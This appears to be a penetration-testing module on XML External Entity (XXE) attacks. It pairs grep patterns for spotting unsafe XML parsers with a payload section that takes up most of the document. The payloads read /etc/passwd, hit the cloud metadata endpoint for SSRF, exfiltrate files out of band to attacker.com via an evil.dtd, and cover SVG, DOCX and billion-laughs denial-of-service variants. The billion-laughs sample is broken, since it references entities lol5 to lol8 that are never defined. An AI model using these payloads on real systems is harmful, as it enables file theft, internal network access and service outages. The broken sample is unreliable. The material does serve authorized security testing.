# VULN MODULE — XML External Entity (XXE)
# Asset: webapp
# CWE-611 | Report prefix: WEB-XXE

## THREAT MODEL

XXE exploits XML parsers that process external entity references.
Impact: local file read, SSRF, RCE (via expect://), DoS (billion laughs).

Injection points: any endpoint accepting XML, DOCX/XLSX/SVG/RSS uploads,
SOAP web services, XML-formatted API bodies.

## WHITEBOX PATTERNS

```bash
# Parser configuration (safe vs unsafe)
grep -rn "DocumentBuilderFactory\|SAXParserFactory\|XMLInputFactory" --include="*.java" -A10
# Look for: setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
# Missing = vulnerable

grep -rn "simplexml_load\|DOMDocument\|XMLReader\|xml_parse" --include="*.php" -A5
# Look for: libxml_disable_entity_loader(true)  — PHP < 8.0
# Missing = vulnerable

grep -rn "lxml\|ElementTree\|xml\.etree\|defusedxml" --include="*.py"
# lxml and ElementTree are vulnerable by default
# defusedxml = safe

grep -rn "nokogiri\|REXML\|LibXML" --include="*.rb"
```

## PAYLOADS

### Classic file read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

### Blind XXE via DNS — OOB exfiltration
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://UNIQUE.burpcollaborator.net/">]>
<root><data>&xxe;</data></root>
```

### Blind XXE — file exfiltration via OOB HTTP
```xml
<!-- Payload sent to server: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root/>

<!-- evil.dtd hosted on attacker.com: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
```

### XInclude (when you can't control DOCTYPE)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SVG XXE (via file upload)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

### Billion laughs DoS
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
<!-- Expands to ~1 billion "lol" strings = memory exhaustion -->
```

## TESTING NON-XML ENDPOINTS

### JSON endpoint with XML parser
```bash
# Change Content-Type to text/xml and send XML body
curl -s -X POST https://target.com/api/data \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### DOCX/XLSX/PPTX upload
```bash
# Extract and modify word/document.xml (for DOCX)
mkdir /tmp/xxe-docx
cp original.docx /tmp/xxe-docx/
cd /tmp/xxe-docx && unzip original.docx
# Edit word/document.xml: add XXE payload
zip -r malicious.docx .
```
